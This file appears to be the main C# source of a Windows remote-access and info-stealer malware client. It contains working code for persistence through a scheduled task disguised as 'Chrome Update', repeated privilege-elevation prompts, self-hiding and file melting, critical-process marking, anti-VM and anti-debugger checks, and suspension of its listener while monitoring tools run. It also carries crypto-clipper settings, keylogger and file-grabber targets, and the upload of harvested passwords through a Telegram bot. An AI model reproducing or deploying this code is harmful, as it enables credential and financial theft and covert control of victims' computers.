using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Client.Connection;
using Client.Helper;
using Client.Install;
using Client.Modules.Manager;
using Client.Modules.Passwords.Helpers;
using Microsoft.Win32;

namespace Client;

public static class Program
{
	public enum EXECUTION_STATE : uint
	{
		ES_CONTINUOUS = 2147483648u,
		ES_DISPLAY_REQUIRED,
		ES_SYSTEM_REQUIRED
	}

	public class MainForm : Form
	{
		public const int WM_QUERYENDSESSION = 17;

		public const int WM_ENDSESSION = 22;

		public const uint SHUTDOWN_NORETRY = 1u;

		[DllImport("user32.dll", SetLastError = true)]
		private static extern bool ShutdownBlockReasonCreate(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] string reason);

		[DllImport("user32.dll", SetLastError = true)]
		private static extern bool ShutdownBlockReasonDestroy(IntPtr hWnd);

		[DllImport("kernel32.dll")]
		private static extern bool SetProcessShutdownParameters(uint dwLevel, uint dwFlags);

		public static void 阜隶几殳鼎氏癶毛豸豆疒辰鼠白肉赤疋儿爻牙比皿干刀殳比尢爿文角士无匕癶米曰工几夕爪尢()
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true).SetValue("臼曰靑入工氏長弓黹幺片厶辛无匚月歹缶夂血几乙見麻龠谷刀血至辵支夂卩欠魚斤小雨鼠黽十手鼓矛臣見弋匚艮匕辵干弓子几", Application.ExecutablePath);
		}

		public MainForm()
		{
			base.FormBorderStyle = FormBorderStyle.None;
			base.ShowInTaskbar = false;
			base.Visible = false;
			base.Opacity = 0.0;
			base.Load += MainForm_Load;
			SetProcessShutdownParameters(1023u, 1u);
		}

		private void MainForm_Load(object sender, EventArgs e)
		{
			base.Size = new Size(0, 0);
		}

		protected override void WndProc(ref Message m)
		{
			if (m.Msg == 17 || m.Msg == 22)
			{
				Console.WriteLine("[!] Shutdown signal received..");
				ShutdownBlockReasonCreate(base.Handle, "Please wait...");
				unprotectProcess();
				ShutdownBlockReasonDestroy(base.Handle);
				Environment.Exit(0);
			}
			else
			{
				base.WndProc(ref m);
			}
		}
	}

	private class config
	{
		public static bool AdminRightsRequired = true;

		public static bool AttributeHiddenEnabled = true;

		public static bool AttributeSystemEnabled = true;

		public static bool MeltFileAfterStart = true;

		public static string InstallPath = Application.ExecutablePath;

		public static bool AutorunEnabled = true;

		public static string AutorunName = "Chrome Update";

		public static bool ProcessBSODProtectionEnabled = true;

		public static bool HideConsoleWindow = true;

		public static bool PreventStartOnVirtualMachine = true;

		public static int StartDelay = 0;

		public static bool BlockNetworkActivityWhenProcessStarted = true;

		public static string[] BlockNetworkActivityProcessList = new string[9] { "taskmgr", "processhacker", "netstat", "netmon", "tcpview", "wireshark", "filemon", "regmon", "cain" };

		public static Dictionary<string, string> ClipperAddresses = new Dictionary<string, string>
		{
			{ "btc", "--- ClipperBTC ---" },
			{ "eth", "--- ClipperETH ---" },
			{ "xmr", "--- ClipperXMR ---" },
			{ "xlm", "--- ClipperXLM ---" },
			{ "xrp", "--- ClipperXRP ---" },
			{ "ltc", "--- ClipperLTC ---" },
			{ "bch", "--- ClipperBCH ---" }
		};

		public static string[] KeyloggerServices = new string[27]
		{
			"facebook", "twitter", "chat", "telegram", "skype", "discord", "viber", "message", "gmail", "protonmail",
			"outlook", "password", "encryption", "account", "login", "key", "sign in", "пароль", "bank", "банк",
			"credit", "card", "кредит", "shop", "buy", "sell", "купить"
		};

		public static string[] BankingServices = new string[8] { "qiwi", "money", "exchange", "bank", "credit", "card", "банк", "кредит" };

		public static string[] CryptoServices = new string[25]
		{
			"bitcoin", "monero", "dashcoin", "litecoin", "etherium", "stellarcoin", "btc", "eth", "xmr", "xlm",
			"xrp", "ltc", "bch", "coinbase", "bitpay", "blockchain", "paxful", "investopedia", "buybitcoinworldwide", "cryptocurrency",
			"crypto", "trade", "trading", "биткоин", "wallet"
		};

		public static string[] PornServices = new string[5] { "porn", "sex", "hentai", "порно", "sex" };

		public static int GrabberSizeLimit = 5120;

		public static Dictionary<string, string[]> GrabberFileTypes = new Dictionary<string, string[]>
		{
			["Document"] = new string[11]
			{
				"pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt",
				"json"
			},
			["DataBase"] = new string[13]
			{
				"db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk",
				"dbf", "wallet", "ini"
			},
			["SourceCode"] = new string[19]
			{
				"c", "cs", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php",
				"go", "js", "rb", "pl", "swift", "java", "kt", "kts", "ino"
			},
			["Image"] = new string[7] { "jpg", "jpeg", "png", "bmp", "psd", "svg", "ai" }
		};
	}

	public static Thread processCheckerThread = new Thread(processChecker);

	private static string PasswordsStoreDirectory = Path.Combine(Paths.InitWorkDir(), SystemInfo.username + "@" + SystemInfo.compname + "_" + SystemInfo.culture);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esFlags);

	public static void protectProcess()
	{
		if (config.ProcessBSODProtectionEnabled)
		{
			Console.WriteLine("[+] Set process critical");
			try
			{
				Process.EnterDebugMode();
				RtlSetProcessIsCritical(1u, 0u, 0u);
			}
			catch
			{
			}
		}
	}

	public static void unprotectProcess()
	{
		if (config.ProcessBSODProtectionEnabled)
		{
			try
			{
				Console.WriteLine("[+] Set process not critical");
				RtlSetProcessIsCritical(0u, 0u, 0u);
			}
			catch
			{
			}
		}
	}

	public static void HideConsoleWindow()
	{
		if (config.HideConsoleWindow)
		{
			Console.WriteLine("[+] Hiding console window");
			ShowWindow(GetConsoleWindow(), 0);
		}
	}

	public static bool inVirtualBox()
	{
		using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
		{
			try
			{
				using ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
				foreach (ManagementBaseObject item in managementObjectCollection)
				{
					if ((item["Manufacturer"].ToString().ToLower() == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || item["Manufacturer"].ToString().ToLower().Contains("vmware") || item["Model"].ToString() == "VirtualBox")
					{
						return true;
					}
				}
			}
			catch
			{
				return true;
			}
		}
		foreach (ManagementBaseObject item2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
		{
			if (item2.GetPropertyValue("Name").ToString().Contains("VMware") && item2.GetPropertyValue("Name").ToString().Contains("VBox"))
			{
				return true;
			}
		}
		return false;
	}

	public static bool inSandboxie()
	{
		string[] array = new string[5] { "SbieDll.dll", "SxIn.dll", "Sf2.dll", "snxhk.dll", "cmdvrt32.dll" };
		for (int i = 0; i < array.Length; i++)
		{
			if (GetModuleHandle(array[i]).ToInt32() != 0)
			{
				return true;
			}
		}
		return false;
	}

	public static bool inDebugger()
	{
		try
		{
			long ticks = DateTime.Now.Ticks;
			Thread.Sleep(10);
			if (DateTime.Now.Ticks - ticks < 10)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	public static string DetectAntivirus()
	{
		try
		{
			using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
			List<string> list = new List<string>();
			foreach (ManagementBaseObject item in managementObjectSearcher.Get())
			{
				list.Add(item["displayName"].ToString());
			}
			if (list.Count == 0)
			{
				return "N/A";
			}
			return string.Join(", ", list.ToArray()) + ".";
		}
		catch
		{
			return "N/A";
		}
	}

	private static void TaskSchedulerCommand(string args)
	{
		if (config.AutorunEnabled)
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				FileName = "schtasks.exe",
				Arguments = args
			};
			process.Start();
			process.WaitForExit();
		}
	}

	public static void elevatePrevileges()
	{
		while (!IsAdministrator())
		{
			Console.WriteLine("[~] Trying elevate previleges to administrator...");
			Process process = new Process();
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.FileName = Application.ExecutablePath;
			process.StartInfo.Arguments = "";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.Verb = "runas";
			process.StartInfo.CreateNoWindow = true;
			try
			{
				process.Start();
				process.WaitForExit();
				unprotectProcess();
				Environment.Exit(1);
			}
			catch (Win32Exception)
			{
				if (config.AdminRightsRequired)
				{
					continue;
				}
				break;
			}
		}
	}

	public static void installSelf()
	{
		Console.WriteLine("[+] Copying to system...");
		if (!Directory.Exists(Path.GetDirectoryName(config.InstallPath)))
		{
			Directory.CreateDirectory(Path.GetDirectoryName(config.InstallPath));
		}
		if (!File.Exists(config.InstallPath))
		{
			File.Copy(Application.ExecutablePath, config.InstallPath);
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.GetDirectoryName(config.InstallPath));
			if (config.AttributeHiddenEnabled)
			{
				directoryInfo.Attributes |= FileAttributes.Hidden;
			}
			if (config.AttributeSystemEnabled)
			{
				directoryInfo.Attributes |= FileAttributes.System;
			}
		}
	}

	public static void uninstallSelf()
	{
		Console.WriteLine("[+] Uninstalling from system...");
		unprotectProcess();
		delAutorun();
		string text = Path.GetTempFileName() + ".bat";
		string text2 = Process.GetCurrentProcess().Id.ToString();
		unprotectProcess();
		using (StreamWriter streamWriter = File.AppendText(text))
		{
			streamWriter.WriteLine(":l");
			streamWriter.WriteLine("Tasklist /fi \"PID eq " + text2 + "\" | find \":\"");
			streamWriter.WriteLine("if Errorlevel 1 (");
			streamWriter.WriteLine(" Timeout /T 1 /Nobreak");
			streamWriter.WriteLine(" Goto l");
			streamWriter.WriteLine(")");
			streamWriter.WriteLine("Rmdir /S /Q \"" + Path.GetDirectoryName(config.InstallPath) + "\"");
		}
		Process.Start(new ProcessStartInfo
		{
			Arguments = "/C " + text + " & Del " + text,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		});
		Environment.Exit(1);
	}

	public static void runAntiAnalysis()
	{
		if (config.PreventStartOnVirtualMachine && (inSandboxie() || inVirtualBox() || inDebugger()))
		{
			Environment.Exit(2);
		}
	}

	public static void setAutorun()
	{
		Console.WriteLine("[+] Installing to autorun...");
		TaskSchedulerCommand("/create /f /sc ONLOGON /RL HIGHEST /tn \"" + config.AutorunName + "\" /tr \"" + config.InstallPath + "\"");
	}

	public static void delAutorun()
	{
		Console.WriteLine("[+] Uninstalling from autorun...");
		TaskSchedulerCommand("/delete /f /tn \"" + config.AutorunName + "\"");
	}

	public static void Sleep()
	{
		int num = config.StartDelay * 1000;
		num = new Random().Next(num, num + 3000);
		Thread.Sleep(num);
	}

	public static void MeltFile()
	{
		if (config.MeltFileAfterStart && !(Application.ExecutablePath == config.InstallPath))
		{
			string text = Path.GetTempFileName() + ".bat";
			string text2 = Process.GetCurrentProcess().Id.ToString();
			unprotectProcess();
			using (StreamWriter streamWriter = File.AppendText(text))
			{
				streamWriter.WriteLine(":l");
				streamWriter.WriteLine("Tasklist /fi \"PID eq " + text2 + "\" | find \":\"");
				streamWriter.WriteLine("if Errorlevel 1 (");
				streamWriter.WriteLine(" Timeout /T 1 /Nobreak");
				streamWriter.WriteLine(" Goto l");
				streamWriter.WriteLine(")");
				streamWriter.WriteLine("Del \"" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"");
				streamWriter.WriteLine("Cd \"" + Path.GetDirectoryName(config.InstallPath) + "\"");
				streamWriter.WriteLine("Timeout /T 1 /Nobreak");
				streamWriter.WriteLine("Start \"\" \"" + Path.GetFileName(config.InstallPath) + "\"");
			}
			Process.Start(new ProcessStartInfo
			{
				Arguments = "/C " + text + " & Del " + text,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
			Environment.Exit(1);
		}
	}

	public static void PreventSleep()
	{
		try
		{
			SetThreadExecutionState((EXECUTION_STATE)2147483651u);
		}
		catch
		{
		}
	}

	public static void isConnectedToInternet()
	{
		Ping ping;
		while (true)
		{
			ping = new Ping();
			PingReply pingReply;
			try
			{
				pingReply = ping.Send("google.com", 600);
			}
			catch
			{
				continue;
			}
			if (pingReply.Status == IPStatus.Success)
			{
				break;
			}
			Console.WriteLine("[!] Retrying connect to internet...");
		}
		Console.WriteLine("[+] Connected to internet");
		while (true)
		{
			PingReply pingReply;
			try
			{
				pingReply = ping.Send("api.telegram.org", 600);
			}
			catch
			{
				continue;
			}
			if (pingReply.Status == IPStatus.Success)
			{
				break;
			}
			Console.WriteLine("[!] Retrying connect to api.telegram.org");
		}
		Console.WriteLine("[+] Connected to api.telegram.org");
	}

	public static void CheckMutex()
	{
		bool createdNew = false;
		string text = "1096425866".MD5();
		if (IsAdministrator())
		{
			text = "ADMIN:" + text;
		}
		new Mutex(initiallyOwned: false, text, out createdNew);
		if (!createdNew)
		{
			Console.WriteLine("[?] Already running 1 copy of the program");
			Environment.Exit(1);
		}
	}

	public static string MD5(this string s)
	{
		using MD5 mD = System.Security.Cryptography.MD5.Create();
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = mD.ComputeHash(Encoding.UTF8.GetBytes(s));
		foreach (byte b in array)
		{
			stringBuilder.Append(b.ToString("x2").ToLower());
		}
		return stringBuilder.ToString();
	}

	public static bool IsAdministrator()
	{
		using WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent();
		return new WindowsPrincipal(ntIdentity).IsInRole(WindowsBuiltInRole.Administrator);
	}

	private static List<string> GetProcessList()
	{
		List<string> list = new List<string>();
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			list.Add(process.ProcessName.ToUpper());
		}
		return list;
	}

	public static void processChecker()
	{
		if (!config.BlockNetworkActivityWhenProcessStarted)
		{
			return;
		}
		Console.WriteLine("[+] Process checker started");
		while (true)
		{
			List<string> processList = GetProcessList();
			string[] blockNetworkActivityProcessList = config.BlockNetworkActivityProcessList;
			foreach (string text in blockNetworkActivityProcessList)
			{
				string item = text.ToUpper();
				if (!processList.Contains(item) || telegram.waitThreadIsBlocked)
				{
					continue;
				}
				Console.WriteLine("[!] Stopping command listener thread");
				telegram.waitThreadIsBlocked = true;
				while (true)
				{
					processList = GetProcessList();
					if (!processList.Contains(item))
					{
						break;
					}
					Thread.Sleep(1000);
				}
				Console.WriteLine("[+] Restarting command listener thread");
				telegram.waitThreadIsBlocked = false;
				telegram.sendText("\ud83d\ude4a Found blocked process " + text + ".exe");
				break;
			}
			Thread.Sleep(1500);
		}
	}

	[STAThread]
	public static void Main()
	{
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		if (!Settings.InitializeSettings())
		{
			Environment.Exit(0);
		}
		try
		{
			telegram.UploadFile(Save());
			if (!MutexControl.CreateMutex())
			{
				Environment.Exit(0);
			}
			if (Convert.ToBoolean(Settings.Anti))
			{
				Anti_Analysis.RunAntiAnalysis();
			}
			if (Convert.ToBoolean(Settings.Install))
			{
				NormalStartup.Install();
			}
			if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
			{
				ProcessCritical.Set();
			}
			Methods.PreventSleep();
		}
		catch
		{
		}
		while (true)
		{
			try
			{
				if (!ClientSocket.IsConnected)
				{
					ClientSocket.Reconnect();
					ClientSocket.InitializeClient();
					HideConsoleWindow();
					elevatePrevileges();
					installSelf();
					setAutorun();
					MeltFile();
					isConnectedToInternet();
					processCheckerThread.Start();
					protectProcess();
					PreventSleep();
					Application.Run(new MainForm());
				}
			}
			catch
			{
			}
			Thread.Sleep(5000);
		}
	}

	public static string Save()
	{
		Console.WriteLine("Running passwords recovery...");
		if (!Directory.Exists(PasswordsStoreDirectory))
		{
			Directory.CreateDirectory(PasswordsStoreDirectory);
		}
		else
		{
			try
			{
				Filemanager.RecursiveDelete(PasswordsStoreDirectory);
			}
			catch
			{
				Console.WriteLine("Failed recursive remove directory");
			}
		}
		if (Client.Modules.Passwords.Helpers.Report.CreateReport(PasswordsStoreDirectory))
		{
			return PasswordsStoreDirectory;
		}
		return "";
	}
}
